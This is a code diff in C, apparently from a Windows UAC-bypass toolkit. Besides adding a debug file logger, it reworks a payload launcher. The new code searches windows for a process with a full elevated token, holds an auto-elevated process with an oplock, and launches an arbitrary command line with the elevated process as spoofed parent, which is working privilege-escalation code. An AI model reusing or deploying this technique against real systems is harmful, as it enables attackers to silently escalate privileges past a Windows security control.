@@ -56,6 +56,63 @@ BOOLEAN ucmxHeapFree(
 }
 
 /*
+* ucmLogMessage
+*
+* Purpose:
+*
+* Simple debug logger.
+*
+*/
+VOID ucmLogMessage(
+    _In_ LPCWSTR FileName,
+    _In_ LPCWSTR Message
+)
+{
+    HANDLE hFile;
+    DWORD written;
+    WCHAR buffer[512];
+    SYSTEMTIME st;
+    DWORD length;
+
+    if (FileName == NULL || Message == NULL) {
+        return;
+    }
+
+    GetLocalTime(&st);
+
+    length = wsprintf(
+        buffer,
+        L"[%02u:%02u:%02u.%03u] %s\r\n",
+        st.wHour,
+        st.wMinute,
+        st.wSecond,
+        st.wMilliseconds,
+        Message);
+
+    hFile = CreateFile(
+        FileName,
+        FILE_APPEND_DATA,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    WriteFile(
+        hFile,
+        buffer,
+        length * sizeof(WCHAR),
+        &written,
+        NULL);
+
+    CloseHandle(hFile);
+}
+
+/*
 * ucmIsProcess32bit
 *
 * Purpose:
@@ -1187,7 +1244,6 @@ BOOL ucmLaunchPayload3(
 {
     BOOL bResult = FALSE, bCommandLineAllocated = FALSE;
     ULONG i;
-    HWND hwnd;
     HANDLE hProcess = NULL;
     LPWSTR lpCommandLine = NULL;
     SIZE_T memIO;
@@ -1249,8 +1305,8 @@ BOOL ucmLaunchPayload3(
         ofc.Length = sizeof(ofc);
         ofc.FileHandle = INVALID_HANDLE_VALUE;
 
-        hwnd = ucmFindFirstElevatedWindow();
-        if (!hwnd) {
+        hProcess = ucmFindFirstElevatedProcessHandle();
+        if (!hProcess) {
 
             RtlSecureZeroMemory(szOplockPath, sizeof(szOplockPath));
 
@@ -1259,47 +1315,41 @@ BOOL ucmLaunchPayload3(
                 _strcpy(szOplockPath, USER_SHARED_DATA->NtSystemRoot);
                 _strcat(szOplockPath, pszOpLockFile);
                 break;
+            case UacMethodTabTip:
+                _strcpy(szOplockPath, pszOpLockFile);
+                break;
             default:
                 break;
             }
 
-#ifdef _DEBUG
-            OutputDebugString(szOplockPath);
-            OutputDebugString(TEXT("\r\n"));
-#endif
             if (ucmStartLockedElevatedProcess(
                 szOplockPath,
                 pszTask,
                 &ofc)) 
             {
-                for (i = 0; i < 5000; i += 500) {
-                    ucmSleep(500);
-                    hwnd = ucmFindFirstElevatedWindow();
-                    if (hwnd)
+                for (i = 0; i < 5000; i += 50) {
+                    hProcess = ucmFindFirstElevatedProcessHandle();
+                    if (hProcess)
                         break;
+                    ucmSleep(50);
                 }
+            }
+
+            if (ofc.FileHandle != INVALID_HANDLE_VALUE) {
+                ucmReleaseOpLock(&ofc);
             }
         }
 
-        if (hwnd) {
+        if (hProcess) {
             RtlSecureZeroMemory(&pi, sizeof(pi));
-            hProcess = ucmGetHwndFullProcessHandle(hwnd);
-            if (hProcess)
-            {
-                bResult = ucmCreateProcessWithParent(lpCommandLine, hProcess, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
-                if (bResult) {
-                    CloseHandle(pi.hThread);
-                    CloseHandle(pi.hProcess);
+            bResult = ucmCreateProcessWithParent(lpCommandLine, hProcess, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
+            if (bResult) {
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
 
-                }
-                CloseHandle(hProcess);
             }
+            CloseHandle(hProcess);
         }
-
-        if (ofc.FileHandle != INVALID_HANDLE_VALUE) {
-            ucmReleaseOpLock(&ofc);
-        }
-
     }
 
     //
@@ -2410,6 +2460,10 @@ BOOL ucmxEnumElevatedWindows(
     DWORD tkElvType = 0;
     DWORD retLen = 0;
 
+    if (!lParam) {
+        return FALSE;
+    }
+
     GetWindowThreadProcessId(hwnd, &dwPid);
     if (dwPid == 0) {
         // Continue to next window.
@@ -2439,14 +2493,18 @@ BOOL ucmxEnumElevatedWindows(
 
     CloseHandle(hToken);
 
-    if (tkElvType == TokenElevationTypeFull) {
-        //
-        // Stop enumeration and return hwnd.
-        //
-        *(HWND*)lParam = hwnd;
-        return FALSE;
+    if (tkElvType != TokenElevationTypeFull) {
+        return TRUE;
     }
 
+    hProcess = ucmGetHwndFullProcessHandle(hwnd);
+    if (hProcess) {
+        //
+        // Stop enumeration.
+        //
+        *(HANDLE*)lParam = hProcess;
+        return FALSE;
+    }
     return TRUE;
 }
 
@@ -2465,6 +2523,40 @@ HWND ucmFindFirstElevatedWindow(
     HWND hwnd = NULL;
     EnumWindows((WNDENUMPROC)ucmxEnumElevatedWindows, (LPARAM)&hwnd);
     return hwnd;
+}
+
+HANDLE ucmFindFirstElevatedProcessHandle(
+    VOID
+)
+{
+    HWND hwnd = NULL;
+    HANDLE hProcess = NULL;
+
+    do {
+
+        hwnd = FindWindowEx(HWND_MESSAGE, hwnd, NULL, NULL);
+        if (hwnd) {
+            if (!ucmxEnumElevatedWindows(hwnd, (LPARAM)&hProcess)) {
+                break;
+            }
+        }
+
+    } while (hwnd);
+
+    if (!hwnd) {
+        do {
+
+            hwnd = FindWindowEx(NULL, hwnd, NULL, NULL);
+            if (hwnd) {
+                if (!ucmxEnumElevatedWindows(hwnd, (LPARAM)&hProcess)) {
+                    break;
+                }
+            }
+
+        } while (hwnd);
+    }
+
+    return hProcess;
 }
 
 /*
